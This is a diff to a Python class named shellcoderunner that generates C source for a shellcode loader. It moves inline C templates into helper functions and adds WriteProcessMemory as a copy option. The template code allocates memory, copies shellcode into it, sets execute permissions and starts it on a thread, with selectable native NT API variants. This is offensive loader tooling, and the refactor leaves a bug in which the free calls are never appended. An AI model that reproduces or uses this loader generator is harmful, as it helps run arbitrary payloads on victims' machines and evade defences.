@@ -1,4 +1,5 @@
 from string import Template
+from c.utils.functions import *
 
 class shellcoderunner:
     def __init__(self, arguments):
@@ -14,31 +15,6 @@ class shellcoderunner:
             else:
                 print('Allocation argument must be VirtualAlloc, HeapAlloc, or NtAllocateVirtualMemory')
                 exit(0)
-        if self.allocation == 'VirtualAlloc':
-            self.allocationCode = """
-    LPVOID buffer = {VirtualAlloc}(NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-"""
-            self.freeCode = """
-    {VirtualFree}(buffer, 0, MEM_RELEASE);
-"""
-        elif self.allocation == 'HeapAlloc':
-            self.allocationCode = """
-    HANDLE hHeap = {HeapCreate}(0, {shellcodeSize}, 0);
-    LPVOID buffer = {HeapAlloc}(hHeap, HEAP_ZERO_MEMORY, {shellcodeSize});
-"""
-            self.freeCode = """
-    {HeapFree}(hHeap, 0, buffer);
-    {HeapDestroy}(hHeap);
-"""
-        elif self.allocation == 'NtAllocateVirtualMemory':
-            self.allocationCode = """
-    PVOID buffer = NULL;
-    SIZE_T allocationSize = {shellcodeSize};
-    {NtAllocateVirtualMemory}((HANDLE)-1, &buffer, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-"""
-            self.freeCode = """
-    {NtFreeVirtualMemory}((HANDLE)-1, &buffer, 0, MEM_RELEASE);
-"""
 
         self.execution = 'CreateThread'
         if 'execution' in arguments:
@@ -47,32 +23,14 @@ class shellcoderunner:
             else:
                 print('Execution argument must be CreateThread or NtCreateThreadEx')
                 exit(0)
-        if self.execution == 'CreateThread':
-            self.executionCode = """
-    HANDLE hThread = {CreateThread}(NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);
-"""
-        elif self.execution == 'NtCreateThreadEx':
-            self.executionCode = """
-    HANDLE hThread;
-    {NtCreateThreadEx}(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, (PVOID)buffer, NULL, 0, (SIZE_T)0, (SIZE_T)0, (SIZE_T)0, NULL);
-"""
 
         self.copy = 'memcpy'
         if 'copy' in arguments:
-            if arguments['copy'] in ['memcpy', 'NtWriteVirtualMemory']:
+            if arguments['copy'] in ['memcpy', 'NtWriteVirtualMemory', 'WriteProcessMemory']:
                 self.copy = arguments['copy']
             else:
-                print('Copy argument must be memcpy or NtWriteVirtualMemory')
+                print('Copy argument must be memcpy, WriteProcessMemory, or NtWriteVirtualMemory')
                 exit(0)
-        if self.copy == 'memcpy':
-            self.copyCode = """
-    memcpy(buffer, shellcode, {shellcodeSize});
-"""
-        elif self.copy == 'NtWriteVirtualMemory':
-            self.copyCode = """
-    SIZE_T bytesWritten = 0;
-    {NtWriteVirtualMemory}((HANDLE)-1, buffer, shellcode, {shellcodeSize}, &bytesWritten);
-"""
 
         self.protect = 'VirtualProtect'
         if 'protect' in arguments:
@@ -81,17 +39,6 @@ class shellcoderunner:
             else:
                 print('Protect argument must be WaitForSingleObject or NtWaitForSingleObject')
                 exit(0)
-        if self.protect == 'VirtualProtect':
-            self.protectCode = Template("""
-    DWORD oldProtect;
-    {VirtualProtect}(buffer, {shellcodeSize}, $memoryPermission, &oldProtect);
-""").substitute(memoryPermission=self.memoryPermission)
-        elif self.protect == 'NtProtectVirtualMemory':
-            self.protectCode = Template("""
-    SIZE_T size = {shellcodeSize};
-    ULONG OldProtect; 
-    {NtProtectVirtualMemory}((HANDLE)-1, &buffer, &size, $memoryPermission, &OldProtect);
-""").substitute(memoryPermission=self.memoryPermission)
 
         self.wait = 'WaitForSingleObject'
         if 'wait' in arguments:
@@ -100,16 +47,6 @@ class shellcoderunner:
             else:
                 print('Wait argument must be WaitForSingleObject or NtWaitForSingleObject')
                 exit(0)
-        if self.wait == 'WaitForSingleObject':
-            self.waitCode = """
-    {WaitForSingleObject}(hThread, INFINITE);
-"""
-        elif self.wait == 'NtWaitForSingleObject':
-            self.waitCode = """
-    LARGE_INTEGER li = {{ 0 }};
-    li.QuadPart = -1;
-    {NtWaitForSingleObject}(hThread, FALSE, NULL);
-"""
 
         self.close = 'CloseHandle'
         if 'close' in arguments:
@@ -118,14 +55,7 @@ class shellcoderunner:
             else:
                 print('Close argument must be CloseHandle, or NtClose')
                 exit(0)
-        if self.close == 'CloseHandle':
-            self.closeCode = """
-    {CloseHandle}(hThread);
-"""
-        elif self.close == 'NtClose':
-            self.closeCode = """
-    {NtClose}(hThread);
-"""
+
 
 
     def imports(self) -> list[str]:
@@ -141,13 +71,47 @@ class shellcoderunner:
         return ''
 
     def template(self) -> str:
-        return Template("""
-    {transformers}
-    $allocation
-    $copy
-    $protect
-    $execution
-    $wait
-    $close
-    $free
-""").substitute(allocation=self.allocationCode, free=self.freeCode, execution=self.executionCode, protect=self.protectCode, copy=self.copyCode, wait=self.waitCode, close=self.closeCode)
+        template = '{transformers}'
+
+        if self.allocation == 'VirtualAlloc':
+            template += VirtualAlloc('buffer', '{shellcodeSize}', 'MEM_COMMIT | MEM_RESERVE', 'PAGE_READWRITE')
+        elif self.allocation == 'HeapAlloc':
+            template += HeapAlloc('buffer', 'HEAP_ZERO_MEMORY', '{shellcodeSize}')
+        elif self.allocation == 'NtAllocateVirtualMemory':
+            template += NtAllocateVirtualMemory('buffer', '(HANDLE)-1', '{shellcodeSize}', 'MEM_COMMIT | MEM_RESERVE', 'PAGE_READWRITE')
+
+        if self.copy == 'memcpy':
+            template += memcpy('buffer', 'shellcode', '{shellcodeSize}')
+        elif self.copy == 'NtWriteVirtualMemory':
+            template += NtWriteVirtualMemory('(HANDLE)-1', 'buffer', 'shellcode', '{shellcodeSize}')
+        elif self.copy == 'WriteProcessMemory':
+            template += WriteProcessMemory('(HANDLE)-1', 'buffer', 'shellcode', '{shellcodeSize}')
+
+        if self.protect == 'VirtualProtect':
+            template += VirtualProtect('buffer', '{shellcodeSize}', self.memoryPermission)
+        elif self.protect == 'NtProtectVirtualMemory':
+            template += NtProtectVirtualMemory('(HANDLE)-1', 'buffer', '{shellcodeSize}', self.memoryPermission)
+
+        if self.execution == 'CreateThread':
+            template += CreateThread('hThread', 'buffer')
+        elif self.execution == 'NtCreateThreadEx':
+            template += NtCreateThreadEx('hThread', '(HANDLE)-1', 'buffer')
+
+        if self.wait == 'WaitForSingleObject':
+            template += WaitForSingleObject('hThread', 'INFINITE')
+        elif self.wait == 'NtWaitForSingleObject':
+            template += NtWaitForSingleObject('hThread', 'INFINITE')
+
+        if self.close == 'CloseHandle':
+            template += CloseHandle('hThread')
+        elif self.close == 'NtClose':
+            template += NtClose('hThread')
+
+        if self.allocation == 'VirtualAlloc':
+            VirtualFree('buffer')
+        elif self.allocation == 'HeapAlloc':
+            HeapFree('hHeap', 'buffer')
+        elif self.allocation == 'NtAllocateVirtualMemory':
+            NtFreeVirtualMemory('(HANDLE)-1', 'buffer')
+
+        return template
